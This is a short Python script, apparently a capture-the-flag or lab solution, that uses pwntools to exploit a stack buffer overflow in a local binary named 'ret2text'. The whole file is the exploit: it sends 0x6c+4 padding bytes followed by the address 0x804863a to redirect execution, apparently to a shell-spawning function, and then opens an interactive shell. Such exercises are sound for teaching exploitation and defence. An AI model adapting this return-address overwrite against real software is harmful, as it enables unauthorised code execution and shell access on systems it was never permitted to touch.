#!/usr/bin/python
from pwn import *

bash_addr = 0x804863a

padding_len = 0x6c+4
payload = b'q'*padding_len + p32(bash_addr)

sh = process('./ret2text')
sh.sendline(payload)
sh.interactive()


